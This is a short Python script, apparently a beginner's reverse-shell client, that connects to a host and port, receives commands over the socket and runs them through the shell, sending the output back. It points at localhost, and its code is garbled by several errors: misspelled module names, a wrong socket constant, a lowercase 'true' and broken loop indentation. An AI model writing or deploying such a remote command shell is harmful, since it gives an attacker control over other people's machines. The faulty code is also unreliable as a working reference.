import socket
import subprocces
import os

ip = "127.0.0.1"
port = 50000

s = socket.socket(socket.AF_INET, socket.SOCKET_STREAM)
s.connect((ip, port))

while True:
  command = s.recv(1024).decode()

rslt = subproccess.check_output(command,shell=true)
s.send(rslt)
command = ""
